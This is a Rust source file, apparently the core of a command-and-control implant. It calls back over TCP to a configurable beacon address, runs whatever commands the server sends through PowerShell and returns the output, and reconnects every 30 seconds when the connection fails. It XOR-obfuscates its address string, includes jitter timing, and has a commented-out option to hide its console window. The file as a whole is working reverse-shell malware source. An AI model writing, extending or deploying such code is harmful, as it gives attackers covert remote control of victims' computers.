// #![windows_subsystem = "windows"]

use crate::{
    commands::run_ps,
    models::{read, write},
};
use rand::Rng;
use tokio::net::TcpStream;
use tokio::time::{sleep, Duration};
use xorcrypt::{e, prepare_encryption};
mod commands;
mod models;
prepare_encryption!();

async fn send_system_info(_conn: &mut TcpStream, interval: f64, jitter: f64) {
    loop {
        let jitter_value = rand::thread_rng().gen_range(0.0..jitter);
        let sleep_duration = Duration::from_secs_f64(interval + jitter_value);

        sleep(sleep_duration).await;
    }
}

#[tokio::main]
async fn main() {
    let addr = e!("127.0.0.1:8085");
    // let addr = e!("BEACON_IP:BEACON_PORT");

    loop {
        match TcpStream::connect(&addr).await {
            Ok(mut conn) => {
                println!("Connected to server");

                loop {
                    match read(&mut conn).await {
                        Some(cmd) => {
                            if commands::process(&cmd, &mut conn).await.is_ok() {
                                continue;
                            };
                            let command = String::from_utf8(cmd.clone()).unwrap();
                            match command.as_str() {
                                "exit" => {
                                    write(&mut conn, b"::EOF::".to_vec()).await.unwrap();
                                    break;
                                }
                                _ => {
                                    let output = run_ps(command).await;
                                    if write(&mut conn, output).await.is_err() {
                                        break;
                                    }
                                }
                            }
                        }
                        None => {
                            println!("Connection closed by server");
                            break;
                        }
                    }
                }
            }
            Err(e) => {
                println!("Failed to connect: {}", e);
                sleep(Duration::from_secs(30)).await;
            }
        }
    }
}
